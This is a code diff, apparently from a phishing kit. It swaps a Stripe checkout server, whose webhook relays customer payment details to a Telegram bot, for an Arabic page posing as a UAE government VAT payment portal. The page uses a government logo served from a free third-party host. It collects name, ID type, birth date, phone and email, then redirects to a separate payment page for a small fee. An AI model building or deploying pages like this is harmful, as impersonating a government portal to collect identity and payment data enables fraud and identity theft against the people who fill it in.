@@ -1,111 +1,82 @@
-const express = require('express');
-const axios = require('axios');
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة دفع ضريبة القيمة المضافة</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;background:#f3f6f9;margin:0;padding:20px;box-sizing:border-box}
+        .container{max-width:420px;margin:30px auto}
+        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.08)}
+        .logo{max-width:220px;display:block;margin:0 auto 12px}
+        h1{text-align:center;margin:6px 0 12px}
+        input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;margin-bottom:12px;box-sizing:border-box}
+        .dob{display:flex;gap:8px}
+        .dob input{flex:1}
+        button{width:100%;padding:12px;background:#0b61c2;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer}
+        .note{font-size:13px;color:#666;text-align:center;margin-top:10px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار" class="logo">
+            <h1>بوابة دفع ضريبة القيمة المضافة</h1>
 
-// --- ابدأ قسم الإعدادات ---
-// استبدل بمفاتيحك الحقيقية
-const STRIPE_SECRET_KEY = 'sk_test_YOUR_SECRET_KEY';
-const STRIPE_PUBLISHABLE_KEY = 'pk_test_YOUR_PUBLISHABLE_KEY';
-const STRIPE_WEBHOOK_SECRET = 'whsec_...'; // ستحصل عليه من Stripe CLI أو لوحة التحكم
+            <form id="personalForm" autocomplete="off">
+                <input id="fullName" type="text" placeholder="الاسم الكامل" required>
+                <select id="idType" required>
+                    <option value="">اختر نوع الهوية</option>
+                    <option value="هوية اماراتية">الهوية الإماراتية</option>
+                    <option value="جواز سفر">جواز السفر</option>
+                </select>
 
-// معلومات بوت تليجرام
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+                <label style="display:block;margin-bottom:6px;font-weight:600">تاريخ الميلاد (ميلادي)</label>
+                <div class="dob">
+                    <input id="day" type="number" placeholder="يوم" min="1" max="31" required>
+                    <input id="month" type="number" placeholder="شهر" min="1" max="12" required>
+                    <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required>
+                </div>
 
-const YOUR_DOMAIN = 'http://localhost:3000';
-const PORT = 3000;
-// --- انتهى قسم الإعدادات ---
+                <input id="phone" type="tel" placeholder="رقم الجوال" required>
+                <input id="email" type="email" placeholder="البريد الإلكتروني" required>
 
-const stripe = require('stripe')(STRIPE_SECRET_KEY);
-const app = express();
+                <button type="submit">التالي</button>
+            </form>
 
-// دالة لإرسال رسالة إلى تليجرام
-const sendTelegramNotification = async (message) => {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try {
-    await axios.post(url, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown' // لتنسيق الرسالة بشكل أفضل
-    });
-    console.log('تم إرسال إشعار تليجرام بنجاح.');
-  } catch (error) {
-    console.error('فشل إرسال إشعار تليجرام:', error.response ? error.response.data : error.message);
-  }
-};
+            <p class="note">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
+        </div>
+    </div>
 
-// نقطة نهاية خاصة بالـ Webhook - لا تستخدم express.json() قبلها
-app.post('/stripe-webhook', express.raw({type: 'application/json'}), async (req, res) => {
-  const sig = req.headers['stripe-signature'];
-  let event;
+<script>
+document.getElementById('personalForm').addEventListener('submit', function(e){
+    e.preventDefault();
 
-  try {
-    event = stripe.webhooks.constructEvent(req.body, sig, STRIPE_WEBHOOK_SECRET);
-  } catch (err) {
-    console.error(`Webhook Error: ${err.message}`);
-    await sendTelegramNotification(`⚠️ خطأ في التحقق من Webhook: ${err.message}`);
-    return res.status(400).send(`Webhook Error: ${err.message}`);
-  }
+    const fullName = document.getElementById('fullName').value.trim();
+    const idType = document.getElementById('idType').value;
+    const day = document.getElementById('day').value;
+    const month = document.getElementById('month').value;
+    const year = document.getElementById('year').value;
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
 
-  // التعامل مع حدث الدفع الناجح
-  if (event.type === 'checkout.session.completed') {
-    const session = event.data.object;
-    
-    // استخراج البيانات
-    const customerName = session.metadata.customer_name;
-    const customerEmail = session.customer_details.email;
-    const amountTotal = (session.amount_total / 100).toFixed(2); // تحويل من سنت إلى دولار
-    const currency = session.currency.toUpperCase();
-    const paymentId = session.payment_intent;
+    if(!fullName || !idType || !day || !month || !year || !phone || !email){
+        alert('الرجاء ملء كافة الحقول المطلوبة.');
+        return;
+    }
 
-    // إنشاء رسالة منسقة
-    const message = `
-✅ **عملية دفع ناجحة** ✅
+    // خزن البيانات مؤقتًا في sessionStorage لصفحة الدفع التالية
+    const data = {
+        fullName, idType,
+        birth: `${day}/${month}/${year}`,
+        phone, email,
+        amount: "10 AED"
+    };
+    sessionStorage.setItem('taxPaymentData', JSON.stringify(data));
 
-*الاسم:* ${customerName}
-*البريد الإلكتروني:* ${customerEmail}
-*المبلغ:* *${amountTotal} ${currency}*
-*معرف العملية:* \`${paymentId}\`
-`;
-    
-    // إرسال الإشعار
-    await sendTelegramNotification(message);
-  }
-
-  res.json({received: true});
+    // انتقل إلى صفحة الدفع
+    window.location.href = 'payment.html';
 });
-
-// استخدام express.json() لباقي المسارات
-app.use(express.json());
-app.use(express.static('.'));
-
-app.post('/create-checkout-session', async (req, res) => {
-  try {
-    const { name, email } = req.body;
-
-    const session = await stripe.checkout.sessions.create({
-      payment_method_types: ['card'],
-      line_items: [{
-        price_data: {
-          currency: 'usd',
-          product_data: { name: 'منتج رقمي مميز' },
-          unit_amount: 2000,
-        },
-        quantity: 1,
-      }],
-      mode: 'payment',
-      success_url: `${YOUR_DOMAIN}/success.html`,
-      cancel_url: `${YOUR_DOMAIN}/cancel.html`,
-      // تمرير البيانات الإضافية هنا
-      customer_email: email,
-      metadata: {
-        customer_name: name
-      }
-    });
-
-    res.json({ sessionId: session.id, publishableKey: STRIPE_PUBLISHABLE_KEY });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-
-app.listen(PORT, () => console.log(`الخادم يعمل على http://localhost:${PORT}`));
+</script>
+</body>
+</html>
